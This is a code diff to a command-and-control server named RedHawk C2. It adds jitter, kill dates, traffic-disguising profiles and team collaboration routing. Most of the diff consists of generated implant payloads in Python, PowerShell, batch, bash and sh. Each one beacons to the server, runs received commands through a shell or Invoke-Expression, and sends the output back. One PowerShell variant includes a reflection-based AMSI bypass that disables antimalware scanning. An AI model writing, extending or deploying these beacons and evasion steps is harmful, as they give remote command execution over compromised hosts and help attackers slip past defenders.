@@ -21,6 +21,8 @@ import * as fs from 'fs';
 import * as path from 'path';
 import * as url from 'url';
 import { EventEmitter } from 'events';
+import { CollabHub } from './collab-hub';
+import type { ProfileManager } from './profile-manager';
 
 export interface C2Agent {
   id: string;
@@ -53,6 +55,7 @@ export interface C2Config {
   killDate: string;
   jitter: number;
   userAgent: string;
+  profileName: string;
 }
 
 const DEFAULT_CONFIG: C2Config = {
@@ -62,6 +65,7 @@ const DEFAULT_CONFIG: C2Config = {
   killDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 days
   jitter: 3,
   userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+  profileName: 'default',
 };
 
 export class C2Server extends EventEmitter {
@@ -71,10 +75,33 @@ export class C2Server extends EventEmitter {
   private tasks: Map<string, C2Task> = new Map();
   private running = false;
   private pollClients: Map<string, any[]> = new Map(); // agentId -> response queue
+  collabHub: CollabHub | null = null;
+  private profileManager: ProfileManager | null = null;
+  private resolvedProfile: any = null;
 
   constructor(config: Partial<C2Config> = {}) {
     super();
     this.config = { ...DEFAULT_CONFIG, ...config };
+  }
+
+  setProfileManager(pm: ProfileManager) {
+    this.profileManager = pm;
+    this.resolveProfile();
+  }
+
+  private resolveProfile() {
+    if (!this.profileManager) return;
+    this.resolvedProfile = this.profileManager.resolve(this.config.profileName, {
+      http: {
+        jitter: this.config.jitter,
+        sleep: this.config.killDate ? 10 : 5,
+        userAgent: this.config.userAgent,
+      } as any,
+    });
+  }
+
+  attachCollab(hub: CollabHub) {
+    this.collabHub = hub;
   }
 
   start(): Promise<boolean> {
@@ -199,111 +226,176 @@ export class C2Server extends EventEmitter {
 
   /**
    * Generate agent payload for various target environments
+   * @param agentType - target runtime (python, powershell, powershell-amsi, batch, bash, sh, csharp, vba, nim, rust)
+   * @param sleepSeconds - base sleep interval in seconds between check-ins (default: 5)
+   * @param jitterPercent - random jitter as percentage of sleep (default: 30)
+   * @param killDate - ISO date string after which the agent stops (default: never)
    */
-  generateAgentPayload(agentType: string): string {
+  generateAgentPayload(agentType: string, sleepSeconds: number = 5, jitterPercent: number = 30, killDate?: string): string {
     const host = this.config.listenHost === '0.0.0.0' ? '127.0.0.1' : this.config.listenHost;
     const proto = this.config.useHttps ? 'https' : 'http';
     const serverUrl = `${proto}://${host}:${this.config.listenPort}`;
+    const sleepMin = Math.max(1, Math.round(sleepSeconds * (1 - jitterPercent / 100)));
+    const sleepMax = Math.round(sleepSeconds * (1 + jitterPercent / 100));
+    const killDateLine = killDate
+      ? `\nif ([DateTime]::UtcNow -gt [DateTime]::Parse('${killDate}')) { exit }`
+      : '';
+    // Epoch timestamp for Python kill date check
+    const killEpoch = killDate ? Math.floor(new Date(killDate).getTime() / 1000) : 0;
 
-    switch (agentType) {
+    // Profile-based URIs (fallback to default /c2/ paths)
+    const checkinUri = this.profileUri('get');
+    const resultUri = this.profileUri('post');
+    const uploadUri = this.profileUri('upload');
 
-      // ── Python (default) ──
+    // Wrap the switch result so we can post-process URIs
+    const raw = (() => {
+      switch (agentType) {
+
+      // ── Python Beacon (with jitter, kill date, proper task IDs) ──
       default:
       case 'python': return `
-import urllib.request, urllib.parse, json, socket, subprocess, sys, time, uuid
+import urllib.request, urllib.parse, json, socket, subprocess, sys, time, uuid, random
 C2_URL="${serverUrl}";AID=uuid.uuid4().hex[:8];HN=socket.gethostname();U=subprocess.check_output('whoami',shell=True).decode().strip();O=sys.platform
+SLEEP_MIN=${sleepMin};SLEEP_MAX=${sleepMax}${killDate ? `;KILL_EPOCH=${killEpoch}` : ''}
 while 1:
- try:
+ try:${killDate ? '\n  if time.time() > KILL_EPOCH: break' : ''}
   d=json.dumps({"id":AID,"hostname":HN,"username":U,"os":O}).encode()
   r=json.loads(urllib.request.urlopen(urllib.request.Request(f"{C2_URL}/c2/checkin",data=d,headers={"Content-Type":"application/json"},method="POST"),timeout=30).read().decode())
   if r.get("task")and r["task"].get("command"):
    try: o=subprocess.check_output(r["task"]["command"],shell=True,stderr=subprocess.STDOUT,timeout=60).decode()
    except Exception as e: o=str(e)
    urllib.request.urlopen(f"{C2_URL}/c2/result",data=json.dumps({"taskId":r["task"]["id"],"agentId":AID,"output":o,"status":"completed"}).encode(),headers={"Content-Type":"application/json"})
-  time.sleep(5)
- except: time.sleep(10)
+  time.sleep(random.uniform(SLEEP_MIN,SLEEP_MAX))
+ except: time.sleep(random.uniform(SLEEP_MIN,SLEEP_MAX))
 `.trim();
 
-      // ── PowerShell (full) ──
+      // ── PowerShell Beacon (with jitter, kill date, proper task IDs) ──
       case 'powershell': return `
-# RedHawk C2 Agent — PowerShell
-$c="${serverUrl}";$id=[System.Guid]::NewGuid().ToString().Substring(0,8);$h=hostname;$u=whoami;$o=(Get-CimInstance Win32_OperatingSystem).Caption
-while($true){try{$b=@{id=$id;hostname=$h;username=$u;os=$o}|ConvertTo-Json;$r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json"
-if($r.task -and $r.task.command){try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
-Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json"}
-Start-Sleep -Seconds 5}catch{Start-Sleep -Seconds 10}}
-`.trim();
+# RedHawk C2 Beacon — PowerShell
+# Generated for: ${serverUrl}
+# Sleep: ${sleepSeconds}s ±${jitterPercent}% (${sleepMin}-${sleepMax}s)
+# Kill date: ${killDate || 'none'}
+$c="${serverUrl}"
+$id=[System.Guid]::NewGuid().ToString().Substring(0,8)
+$sleepMin=${sleepMin};$sleepMax=${sleepMax}
+while($true){${killDateLine}
+  try{
+    $b=@{id=$id;hostname=$(hostname);username=$(whoami);os=((Get-CimInstance Win32_OperatingSystem).Caption)}|ConvertTo-Json
+    $r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json" -TimeoutSec 30
+    if($r.task -and $r.task.command){
+      try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
+      $null=Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json" -TimeoutSec 30
+    }
+  }catch{}
+  $j=[math]::Floor((Get-Random -Minimum 0 -Maximum 1000)/1000*($sleepMax-$sleepMin)+$sleepMin)
+  Start-Sleep -Seconds $j
+}`.trim();
 
-      // ── PowerShell (AMSI-bypassed) ──
+      // ── PowerShell Beacon (AMSI-bypassed, with jitter) ──
       case 'powershell-amsi': return `
-# RedHawk C2 Agent — PowerShell (AMSI Bypassed)
-# Bypasses AMSI then runs the agent loop
+# RedHawk C2 Beacon — PowerShell (AMSI Bypassed)
+# Generated for: ${serverUrl}
+# Sleep: ${sleepSeconds}s ±${jitterPercent}% (${sleepMin}-${sleepMax}s)
+# Kill date: ${killDate || 'none'}
+# AMSI bypass via reflection
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-$c="${serverUrl}";$id=[System.Guid]::NewGuid().ToString().Substring(0,8);$h=hostname;$u=whoami;$o=(Get-CimInstance Win32_OperatingSystem).Caption
-while($true){try{$b=@{id=$id;hostname=$h;username=$u;os=$o}|ConvertTo-Json;$r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json"
-if($r.task -and $r.task.command){try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
-Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json"}
-Start-Sleep -Seconds 5}catch{Start-Sleep -Seconds 10}}
-`.trim();
+$c="${serverUrl}"
+$id=[System.Guid]::NewGuid().ToString().Substring(0,8)
+$sleepMin=${sleepMin};$sleepMax=${sleepMax}
+while($true){${killDateLine}
+  try{
+    $b=@{id=$id;hostname=$(hostname);username=$(whoami);os=((Get-CimInstance Win32_OperatingSystem).Caption)}|ConvertTo-Json
+    $r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json" -TimeoutSec 30
+    if($r.task -and $r.task.command){
+      try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
+      $null=Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json" -TimeoutSec 30
+    }
+  }catch{}
+  $j=[math]::Floor((Get-Random -Minimum 0 -Maximum 1000)/1000*($sleepMax-$sleepMin)+$sleepMin)
+  Start-Sleep -Seconds $j
+}`.trim();
 
       // ── Batch (.bat / CMD) ──
       case 'batch': return `@echo off
-REM RedHawk C2 Agent — Batch
+REM RedHawk C2 Beacon — Batch
+REM Generated for: ${serverUrl}
+REM Sleep: ${sleepSeconds}s ±${jitterPercent}%
 set "C2=${serverUrl}"
 set "ID=%RANDOM%%RANDOM%"
+set "SLEEP_MIN=${sleepMin}"
+set "SLEEP_MAX=${sleepMax}"
 :loop
 for /f "tokens=*" %%a in ('hostname') do set "HN=%%a"
 for /f "tokens=*" %%b in ('whoami') do set "U=%%b"
-REM Check-in via curl (Windows 10+ has it) or fallback to bitsadmin
+${killDate ? `REM Kill date: ${killDate}` : ''}
+REM Check-in
 curl -s -X POST "%C2%/c2/checkin" -H "Content-Type: application/json" -d "{\\"id\\":\\"%ID%\\",\\"hostname\\":\\"%HN%\\",\\"username\\":\\"%U%\\",\\"os\\":\\"Windows\\"}" > %TEMP%\\c2_resp.json 2>nul
 if exist %TEMP%\\c2_resp.json (
-  REM Parse task from response — if command exists, run it
   findstr /C:"command" %TEMP%\\c2_resp.json >nul && (
-    for /f "tokens=*" %%c in ('python -c "import json;d=json.load(open('%TEMP%\\\\c2_resp.json'));print(d.get('task',{}).get('command',''))" 2^>nul') do set "CMD=%%c"
+    for /f "tokens=*" %%c in ('python -c "import json;d=json.load(open('%TEMP%\\\\c2_resp.json'));t=d.get('task',{});print(t.get('id','0'));print(t.get('command',''))" 2^>nul') do set "TASK_ID=%%c" && goto :got_task
+    :got_task
+    for /f "tokens=*" %%d in ('python -c "import json;d=json.load(open('%TEMP%\\\\c2_resp.json'));print(d.get('task',{}).get('command',''))" 2^>nul') do set "CMD=%%d"
     if defined CMD (
       for /f "tokens=*" %%o in ('%CMD% 2^>^&1') do set "OUT=%%o"
-      curl -s -X POST "%C2%/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"task_0\\",\\"agentId\\":\\"%ID%\\",\\"output\\":\\"%OUT%\\",\\"status\\":\\"completed\\"}" >nul 2>nul
+      curl -s -X POST "%C2%/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"%TASK_ID%\\",\\"agentId\\":\\"%ID%\\",\\"output\\":\\"%OUT%\\",\\"status\\":\\"completed\\"}" >nul 2>nul
     )
   )
   del %TEMP%\\c2_resp.json 2>nul
 )
-timeout /t 10 /nobreak >nul
+REM Jitter sleep
+set /a "JITTER=%RANDOM% %% (%SLEEP_MAX% - %SLEEP_MIN% + 1) + %SLEEP_MIN%"
+timeout /t %JITTER% /nobreak >nul
 goto loop`.trim();
 
       // ── Bash / Unix Shell ──
       case 'bash': return `#!/bin/bash
-# RedHawk C2 Agent — Bash
+# RedHawk C2 Beacon — Bash
+# Generated for: ${serverUrl}
+# Sleep: ${sleepSeconds}s ±${jitterPercent}%
 C2="${serverUrl}"
 ID=$(uuidgen 2>/dev/null || echo $RANDOM$$)
 HN=$(hostname)
 U=$(whoami)
 O=$(uname -s)
+SLEEP_MIN=${sleepMin}
+SLEEP_MAX=${sleepMax}
+${killDate ? `KILL_EPOCH=$(date -d '${killDate}' +%s 2>/dev/null || echo 0)` : ''}
 while true; do
+  ${killDate ? `[ -n "$KILL_EPOCH" ] && [ "$(date +%s)" -gt "$KILL_EPOCH" ] && exit 0` : ''}
   RESP=$(curl -s -X POST "$C2/c2/checkin" -H "Content-Type: application/json" -d "{\\"id\\":\\"$ID\\",\\"hostname\\":\\"$HN\\",\\"username\\":\\"$U\\",\\"os\\":\\"$O\\"}")
+  TASK_ID=$(echo "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);t=d.get('task',{});print(t.get('id',''))" 2>/dev/null)
   CMD=$(echo "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('task',{}).get('command',''))" 2>/dev/null)
   if [ -n "$CMD" ]; then
     OUTPUT=$(eval "$CMD" 2>&1)
-    curl -s -X POST "$C2/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"task_0\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" >/dev/null
+    curl -s -X POST "$C2/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"$TASK_ID\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" >/dev/null
   fi
-  sleep 5
+  JITTER=$(( RANDOM % (SLEEP_MAX - SLEEP_MIN + 1) + SLEEP_MIN ))
+  sleep $JITTER
 done`.trim();
 
       // ── Sh (BusyBox / embedded) ──
       case 'sh': return `#!/bin/sh
-# RedHawk C2 Agent — SH (BusyBox compatible)
+# RedHawk C2 Beacon — SH (BusyBox compatible)
+# Generated for: ${serverUrl}
+# Sleep: ${sleepSeconds}s ±${jitterPercent}%
 C2="${serverUrl}"
 ID=$$$(date +%s)
 HN=$(hostname)
 U=$(whoami)
 O=$(uname -o 2>/dev/null || uname -s)
+SLEEP_MIN=${sleepMin}
+SLEEP_MAX=${sleepMax}
 while true; do
   RESP=$(wget -q -O- --post-data="{\\"id\\":\\"$ID\\",\\"hostname\\":\\"$HN\\",\\"username\\":\\"$U\\",\\"os\\":\\"$O\\"}" --header="Content-Type: application/json" "$C2/c2/checkin" 2>/dev/null)
+  TASK_ID=$(echo "$RESP" | sed 's/.*"id":"\\([^"]*\\)".*/\\1/')
   CMD=$(echo "$RESP" | sed 's/.*"command":"\\([^"]*\\)".*/\\1/')
-  if [ -n "$CMD" ]; then
+  if [ -n "$CMD" ] && [ "$CMD" != "$RESP" ]; then
     OUTPUT=$(eval "$CMD" 2>&1)
-    wget -q -O- --post-data="{\\"taskId\\":\\"0\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" --header="Content-Type: application/json" "$C2/c2/result" >/dev/null 2>&1
+    wget -q -O- --post-data="{\\"taskId\\":\\"$TASK_ID\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" --header="Content-Type: application/json" "$C2/c2/result" >/dev/null 2>&1
   fi
-  sleep 10
+  JITTER=$(awk "BEGIN{srand();print int(rand()*($SLEEP_MAX-$SLEEP_MIN+1))+$SLEEP_MIN}" 2>/dev/null || echo $SLEEP_MIN)
+  sleep $JITTER
 done`.trim();
 
       // ── C# (via csc.exe, .NET Framework on Windows) ──
@@ -479,18 +571,49 @@ fn main() {
     }
 }`.trim();
     }
+    })();
+    // Post-process: replace hardcoded URIs with profile-based URIs
+    return raw
+      .replace(/\/c2\/checkin/g, checkinUri)
+      .replace(/\/c2\/result/g, resultUri)
+      .replace(/\/c2\/upload/g, uploadUri);
   }
 
   /**
    * Handle incoming HTTP requests
    */
+  /** Get canonical profile URI — falls back to default paths */
+  private profileUri(key: 'get' | 'post' | 'upload'): string {
+    try {
+      return this.resolvedProfile?.http?.[key]?.uri || `/c2/${key === 'get' ? 'checkin' : key === 'post' ? 'result' : 'upload'}`;
+    } catch {
+      return `/c2/${key === 'get' ? 'checkin' : key === 'post' ? 'result' : 'upload'}`;
+    }
+  }
+
+  /** Apply profile response headers + status */
+  private applyProfileResponse(key: 'get' | 'post' | 'upload', res: http.ServerResponse) {
+    try {
+      const ep = this.resolvedProfile?.http?.[key];
+      if (ep?.response?.headers) {
+        for (const h of ep.response.headers) {
+          res.setHeader(h.name, h.value);
+        }
+      }
+      // Always set CORS
+      res.setHeader('Access-Control-Allow-Origin', '*');
+    } catch {
+      res.setHeader('Access-Control-Allow-Origin', '*');
+    }
+  }
+
   private handleRequest(req: http.IncomingMessage, res: http.ServerResponse) {
     const parsed = url.parse(req.url || '', true);
     const pathname = parsed.pathname;
 
     // CORS headers for Web UI
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PATCH, DELETE');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
     if (req.method === 'OPTIONS') {
@@ -499,32 +622,31 @@ fn main() {
       return;
     }
 
+    // Resolve profile on every request (in case config changes)
+    this.resolveProfile();
+
     // Parse body
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
       try {
-        switch (pathname) {
-          case '/c2/checkin':
-            this.handleCheckin(body, res, req);
-            break;
-          case '/c2/result':
-            this.handleResult(body, res);
-            break;
-          case '/c2/upload':
-            this.handleUpload(req, body, res);
-            break;
-          case '/c2/poll':
-            this.handlePoll(parsed.query, res);
-            break;
-          default:
-            // REST API for the Electron UI
-            if (pathname?.startsWith('/api/')) {
-              this.handleApi(pathname, parsed.query, body, req.method || 'GET', res);
-            } else {
-              res.writeHead(404, { 'Content-Type': 'application/json' });
-              res.end(JSON.stringify({ error: 'not found' }));
-            }
+        const checkinUri = this.profileUri('get');
+        const resultUri = this.profileUri('post');
+        const uploadUri = this.profileUri('upload');
+
+        if (pathname === checkinUri) {
+          this.handleCheckin(body, res, req);
+        } else if (pathname === resultUri) {
+          this.handleResult(body, res);
+        } else if (pathname === uploadUri) {
+          this.handleUpload(req, body, res);
+        } else if (pathname === '/c2/poll') {
+          this.handlePoll(parsed.query, res);
+        } else if (pathname?.startsWith('/api/')) {
+          this.handleApi(pathname, parsed.query, body, req.method || 'GET', res);
+        } else {
+          res.writeHead(404, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'not found' }));
         }
       } catch (err: any) {
         res.writeHead(500, { 'Content-Type': 'application/json' });
@@ -581,7 +703,9 @@ fn main() {
       this.emit('taskSent', nextTask);
     }
 
-    res.writeHead(200, { 'Content-Type': 'application/json' });
+    const getEp = this.resolvedProfile?.http?.get;
+    const status = getEp?.response?.status || 200;
+    res.writeHead(status, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify(response));
   }
 
@@ -597,7 +721,10 @@ fn main() {
       this.emit('taskResult', task);
     }
 
-    res.writeHead(200, { 'Content-Type': 'application/json' });
+    this.applyProfileResponse('post', res);
+    const postEp = this.resolvedProfile?.http?.post;
+    const respStatus = postEp?.response?.status || 200;
+    res.writeHead(respStatus, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ status: 'ok' }));
   }
 
@@ -626,7 +753,10 @@ fn main() {
       this.emit('error', `Upload error: ${err.message}`);
     }
 
-    res.writeHead(200, { 'Content-Type': 'application/json' });
+    this.applyProfileResponse('upload', res);
+    const uploadEp = this.resolvedProfile?.http?.upload;
+    const upStatus = uploadEp?.response?.status || 200;
+    res.writeHead(upStatus, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ status: 'ok' }));
   }
 
@@ -677,6 +807,14 @@ fn main() {
     };
 
     try {
+      // Route collab requests to the hub
+      if (pathname?.startsWith('/api/collab/') && this.collabHub) {
+        const parsedBody = body ? JSON.parse(body) : {};
+        const result = this.collabHub.handleApi(pathname, parsedBody, method);
+        respond(result.data, result.status);
+        return;
+      }
+
       switch (pathname) {
         case '/api/status':
           respond({ running: this.running, agents: this.agents.size, tasks: this.tasks.size, config: this.config });
